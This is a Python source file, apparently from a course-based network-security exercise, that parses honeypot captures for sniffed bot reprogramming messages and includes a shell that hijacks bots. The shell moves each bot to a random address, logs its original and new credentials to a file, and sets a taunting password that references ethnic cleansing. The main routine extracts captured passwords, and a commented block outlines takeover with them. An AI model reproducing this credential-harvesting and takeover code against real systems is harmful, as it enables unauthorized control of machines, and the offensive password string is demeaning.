'''
Created on Feb 18, 2017

@author: sethjn
'''

from bot.common.network import ReprogrammingResponse, ReprogrammingRequest
from bot.common.util import InsertChecksum

from twisted.internet.protocol import Protocol
from playground.network.common.Protocol import MessageStorage
from playground.network.message.ProtoBuilder import MessageDefinition
from twisted.internet.defer import Deferred
from playground.twisted.endpoints.GateEndpoint import GateClientEndpoint, PlaygroundNetworkSettings
from twisted.internet import reactor
from twisted.internet.task import deferLater
from twisted.internet.endpoints import connectProtocol

# these are playground utils
from playground.utils.ui import CLIShell, stdio
from playground import playgroundlog

import sys, os, traceback, getpass, struct
from os import listdir as listdir
from time import time, ctime
from random import SystemRandom as sr

'''
Created on Oct 26, 2016

@author: sethjn
'''
from playground.network.message.ProtoBuilder import MessageDefinition
from playground.network.message.StandardMessageSpecifiers import *


class RipProtocolMessage(MessageDefinition):  
    PLAYGROUND_IDENTIFIER = "RIP.RIPMessageID"
    MESSAGE_VERSION = "1.0"
    BODY = [
            ("sequence_number", UINT4),
            ("acknowledgement_number", UINT4, OPTIONAL),
            ("signature", STRING, DEFAULT_VALUE("")),
            ("certificate", LIST(STRING), OPTIONAL),
            ("sessionID", STRING),
            ("acknowledgement_flag", BOOL1, DEFAULT_VALUE(False)),
            ("close_flag", BOOL1, DEFAULT_VALUE(False)),
            ("sequence_number_notification_flag", BOOL1, DEFAULT_VALUE(False)),
            ("reset_flag", BOOL1, DEFAULT_VALUE(False)),
            ("data", STRING,DEFAULT_VALUE("")),
            ("OPTIONS", LIST(STRING), OPTIONAL)
    ]

class KissHandShake(MessageDefinition):
    PLAYGROUND_IDENTIFIER = "KissHandShake"
    MESSAGE_VERSION = "1.0"
    BODY = [
            ("key", STRING),
            ("IV", STRING)
            ]


class KissData(MessageDefinition):
    PLAYGROUND_IDENTIFIER = "KissData"
    MESSAGE_VERSION = "1.0"
    BODY = [
            ("data", STRING)
            ]

class ReprogrammingClientProtocol(Protocol):
    def __init__(self):
        self.__storage = MessageStorage(ReprogrammingResponse)
        self.__requests = {}
        self.__reqId = 0
        
    def __nextId(self):
        self.__reqId += 1
        return self.__reqId
        
    def dataReceived(self, data):
        self.__storage.update(data)
        print("\nReceived from %s ->" % self.transport.getPeer())
        for message in self.__storage.iterateMessages():
            if not self.__requests.has_key(message.RequestId):
                continue
            #print "getting callback for requestId", message.RequestId
            d = self.__requests[message.RequestId]
            d.callback(message.Data)
        
    def reprogram(self, password, subsystem, data, *additionalSubsystems):
        if len(additionalSubsystems) % 2 != 0:
            raise Exception("Arguments to reprogram is both a subsystem and the data")
        req = ReprogrammingRequest(RequestId=self.__nextId(),
                                   Opcode   =0)
        
        subsystems = [subsystem]
        programs = [data]
        
        while additionalSubsystems:
            subsystems.append(additionalSubsystems.pop(0))
            programs.append(additionalSubsystems.pop(0))
            
        subsystems = map(ReprogrammingRequest.SUBSYSTEMS.index, subsystems)
    
        req.Subsystems = subsystems
        req.Data = programs
        
        InsertChecksum(req, password=password)
        self.__requests[req.RequestId] = Deferred()
        self.transport.write(req.__serialize__())
        return self.__requests[req.RequestId]
    
    def status(self, password, *subsystems):
        subsystems = map(ReprogrammingRequest.SUBSYSTEMS.index, subsystems)
        req = ReprogrammingRequest(RequestId =self.__nextId(),
                                   Opcode    =1,
                                   Subsystems=subsystems,
                                   Data      =[])
        InsertChecksum(req, password=password)
        self.__requests[req.RequestId] = Deferred()
        self.transport.write(req.__serialize__())
        return self.__requests[req.RequestId]
    
    
class ReprogrammingShellProtocol(CLIShell):
    PROMPT = "<Reprogramming Shell>"
    
    RAW_PORT = 666
    ADV_PORT = 667
    
    def __init__(self, botAddress):
        CLIShell.__init__(self, prompt=self.PROMPT)
        self.__botAddress = botAddress
        self.__connectPort = self.RAW_PORT
        self.protocol = None
        self.password = "123456"
        self.toPassword = "NotSetYet"
        
    def connectionMade(self):
        self.connectToBot(self.__connectPort)
        self.__loadCommands()
        
    def __botConnectionMade(self, protocol):
        self.transport.write("Connected to Bot at %s\n" % self.__botAddress)
        self.protocol = protocol
        self.prompt = "[%s::%d] >>" % (self.__botAddress, self.__connectPort)
        
        # Check if this is a stolen bot
        if ".66432.13056." not in self.__botAddress:
            randaddress = "%s.66432.13056.%s" % ( sr().getrandbits(22), sr().getrandbits(22))
            randpw = "~EthnicClensiStanWazHere~UrBotWazBelongToUs@%s~Thanks~%s" % (time(),sr().getrandbits(256))
            self.reprogram(None, "ADDRESS", randaddress)
            
            # Save stolen bot info to new file
            with open("stolenBots.py.data", "a") as f:
                f.write("--origAddr=%s --origPass=%s --destAddr=%s --newPass=%s --timestamp=%s\n" % (self.__botAddress,self.password,randaddress,randpw,time()))
                f.flush()
            
            # Connect to moved bot and change password
            bprotocol = ReprogrammingShellProtocol(randaddress)
            bprotocol.password = self.password
            bprotocol.toPassword = randpw
            stdio.StandardIO(bprotocol)
        else: # This is a stolen bot
            self.reprogram(None, "PASSWORD", self.toPassword)
        
    def reprogram(self, writer, *args):
        print("\tPassword: %s" % (self.password))
        print("Reprogram %s to %s" % (args[0],args[1]))
        if not self.protocol:
            writer("Not yet connected. Cannot reprogram\n")
            return 
        subsystem, reprogramArgument = args
        if subsystem not in ReprogrammingRequest.SUBSYSTEMS:
            self.transport.write("Unknown subsystem %s. Options are %s." % (subsystem, ReprogrammingRequest.SUBSYSTEMS))
            return
        if subsystem in ["PASSWORD", "ADDRESS"]:
            dataToSend = reprogramArgument
        else:
            if not os.path.exists(reprogramArgument):
                self.transport.write("File not found %s" % reprogramArgument)
                return
            
            with open(reprogramArgument) as f:
                dataToSend = f.read()
        #writer("Sending %d byte program to subsystem %s\n" % (len(dataToSend), subsystem))
        d = self.protocol.reprogram(self.password, subsystem, dataToSend)
        d.addCallback(self.handleResponse)
        
    def __checkStatus(self, writer, *args):
        if not self.protocol:
            writer("Not yet connected. Cannot reprogram\n")
            return 
        subsystems = list(args)
        for subsystem in subsystems:
            if subsystem not in ReprogrammingRequest.SUBSYSTEMS:
                self.transport.write("Unknown subsystem %s. Options are %s." % (subsystem, ReprogrammingRequest.SUBSYSTEMS))
                return
        d = self.protocol.status(self.password, *subsystems)
        d.addCallback(self.handleResponse)
        
    def __changePassword(self, writer, *args):
        if args:
            writer("Change password takes no arguments.\n")
        self.password = getpass.getpass("Enter new bot password: ")
        
        writer("Password changed successfully.\n")
        
    def __loadCommands(self):
        toggleCommandHandler = CLIShell.CommandHandler("toggle","Toggle between raw and advanced connection",self.__toggleConnection)
        reprogramCommandHandler = CLIShell.CommandHandler("reprogram", "Reprogram the bot's subsystems", defaultCb=self.reprogram)
        getstatusCommandHandler = CLIShell.CommandHandler("status", "Get the bot's subsystems' status", defaultCb=self.__checkStatus)
        changePasswordCommandHandler = CLIShell.CommandHandler("passwd", "Change the bot's password", defaultCb=self.__changePassword)
        
        self.registerCommand(toggleCommandHandler)
        self.registerCommand(reprogramCommandHandler)
        self.registerCommand(getstatusCommandHandler)
        self.registerCommand(changePasswordCommandHandler)
        
    def __toggleConnection(self, writer):
        if self.__connectPort == self.RAW_PORT:
            self.connectToBot(self.ADV_PORT)
        else: self.connectToBot(self.RAW_PORT)
        
    def connectToBot(self, port):
        if self.protocol:
            self.transport.write("Closing old bot connection on %d\n" % self.__connectPort)
            self.protocol.transport.loseConnection()
            self.transport.write("Reloading protocol\n")
            self.protocol = None
            self.prompt = self.PROMPT
        self.__connectPort = port
        
        
        networkSettings = PlaygroundNetworkSettings()
        networkSettings.configureNetworkStack(port == self.ADV_PORT and ProtocolStack or None)
        playgroundEndpoint = GateClientEndpoint(reactor, self.__botAddress, port, networkSettings)
        
        #self.transport.write("Got Endpoint\n")
        reprogrammingProtocol = ReprogrammingClientProtocol()
        #self.transport.write("Got protocol. Trying to connect\n")
        d = connectProtocol(playgroundEndpoint, reprogrammingProtocol)
        #self.transport.write("Setting callback\n")
        d.addCallback(self.__botConnectionMade)
        d.addErrback(self.handleError)
        #self.transport.write("Waiting for callback\n")
    
    
    def handleResponse(self, data):
        #self.transport.write("Received response from server.\n")
        for serverString in data:
            if "uccessful" in serverString:
                self.transport.write("\t%s\n" % serverString)
                #self.protocol.transport.loseConnection()
            else:
                print("Got weird response back...")
        self.refreshInterface()
            
    def handleError(self, failure):
        self.transport.write("Something went wrong: %s\n" % failure)
        self.refreshInterface()
        # swallow error

class MsgStore(object):
    NUM_MESSAGES = 0
    MESSAGES = dict()
    # key = type, value = list of MsgStore messages of that type

    NUM_WEIRDS = 0
    UNKNOWN_TYPES = dict()
    # key = type, value = list of MsgStore messages of that type

    ERROR_STRINGS = set()

    def __init__(self, stringData):
        ''' string Data Should look like this:
        [&#TS> 1492028327.76] 20171.9.9.20:666 -> 20171.1.927.1:1000 [&#MD>
        ,cyberward.botinterface.ReprogrammingResponse....
        '''
        fullstr = stringData
        try:
            stringData = stringData.split("[&#TS> ")[1]
        except Exception:
            print("'[&#TS> ' Not Found! Improper MsgStore string")
            raise Exception("'[&#TS> ' Not Found! Improper MsgStore string")
        try:
            self.timestamp, ignore, stringData = stringData.partition("] ")
            self.timestamp = float(self.timestamp)

            self.fromAddr, ignore, stringData = stringData.partition(" -> ")
            self.fromAddr, self.fromPort = self.fromAddr.split(":")
            self.fromPort = int(self.fromPort)

            self.toAddr, ignore, stringData = stringData.partition(" [&#MD>\n")
            self.toAddr, self.toPort = self.toAddr.split(":")
            self.toPort = int(self.toPort)

            self.msgStr = stringData
            self.msgDef = self.getMessageDef(self.msgStr)
            self.msg = None
            try:
                self.msg = MessageDefinition.Deserialize(self.msgStr)[0]
                MsgStore.MESSAGES.setdefault(self.msgDef, []).append(self)
                MsgStore.NUM_MESSAGES += 1
            except Exception as e:
                #print("FAILED to deser! Adding to UNKNOWN_TYPES...")
                MsgStore.UNKNOWN_TYPES.setdefault(self.msgDef, []).append(self)
                MsgStore.NUM_WEIRDS += 1
        except Exception as e:
            print("MsgStore Error! Header of problem string:")
            print("     %s . . ." % fullstr[:150])
            MsgStore.ERROR_STRINGS.add(fullstr)
            raise e

    def getMessageDef(self, buf):
        offset = 0
        nameLen = struct.unpack_from("!B", buf, offset)[0]
        offset += struct.calcsize("!B")
        name = struct.unpack_from("!%ds" % nameLen, buf, offset)[0]
        offset += struct.calcsize("!%ds" % nameLen)
        versionLen = struct.unpack_from("!B", buf, offset)[0]
        offset += struct.calcsize("!B")
        version = struct.unpack_from("!%ds" % versionLen, buf, offset)[0]
        offset += struct.calcsize("!%ds" % versionLen)
        versionMajorStr, versionMinorStr = version.split(".")
        versionTuple = (int(versionMajorStr), int(versionMinorStr))
        #print(name)
        #print(versionTuple)
        return name

def main(checkValid = False, steal = False, hpDirectory = "."):
    # TODO - Implement these features ^

    #TODO - serialize everything so it can be run continuously
    # Parse all honeypots
    filenames = [f for f in listdir(hpDirectory) if ".py" not in f]
    filecontents = [open(fn, 'r').read() for fn in filenames]
    messageStrings = []
    for eachFileContents in filecontents:
        messageStrings+=eachFileContents.split("\n<&#MD]\n")
    msgStorErr = 0
    for msgStr in messageStrings:
        if len(msgStr) > 0:
            try:
                MsgStore(msgStr)
            except Exception as e:
                print(e)

    # Begin summary of findings section
    print("\nNum honeypots found: %s" % len(filenames))

    print("\nSuccessfully deserialized: %s" % MsgStore.NUM_MESSAGES)
    for key in MsgStore.MESSAGES.keys():
        print("   Num '%s': %s" % (key,len(MsgStore.MESSAGES[key])))

    print("\nUnknown messages: %s" % MsgStore.NUM_WEIRDS)
    for key in MsgStore.UNKNOWN_TYPES.keys():
        print("   Num '%s': %s" % (key,len(MsgStore.UNKNOWN_TYPES[key])))

    pwRepMS = []
    psRepMS = []
    cfRepMS = []
    for ms in MsgStore.MESSAGES["cyberward.botinterface.ReprogrammingRequest"]:
        if ms.msg.Opcode == 0: # this is a SET request
            if (4 in ms.msg.Subsystems):
                pwRepMS.append(ms)
            if (1 in ms.msg.Subsystems):
                psRepMS.append(ms)
            if (0 in ms.msg.Subsystems):
                cfRepMS.append(ms)

    print ("\nNum reprogram PASSWORD msgs found: %s" % len(pwRepMS))
    for ms in pwRepMS:
        print("   [%s] %s:\t%s" % (ctime(ms.timestamp), ms.toAddr, ms.msg.Data[0]))
        # TODO - Check if still valid (will require modifying ReprogrammingClientProtocol.status(...))
    
    ''' This is the bot stealing. TODO - implement cmdline arg to enable
        # Short-term TODO - implement using Reprogramming*CLIENT*Protocol
        # or better TODO - use escapeBot to change the address first before changing password
        protocol = ReprogrammingShellProtocol(addr)
        protocol.password = pswd
        stdio.StandardIO(protocol)
    #reactor.run()
    '''

    print ("\nNum reprogram PROTOCOL_STACK msgs found: %s" % len(psRepMS))
    for ms in psRepMS:
        print("   [%s / %s] %s:\t%s" % (ctime(ms.timestamp), ms.timestamp, ms.toAddr, len(ms.msg.Data[0])))

    print ("\nNum reprogram CERT_FACTORY msgs found: %s" % len(cfRepMS))
    for ms in cfRepMS:
        print("   [%s / %s] %s:\t%s" % (ctime(ms.timestamp), ms.timestamp, ms.toAddr, len(ms.msg.Data[0])))
if __name__ == "__main__":
    main()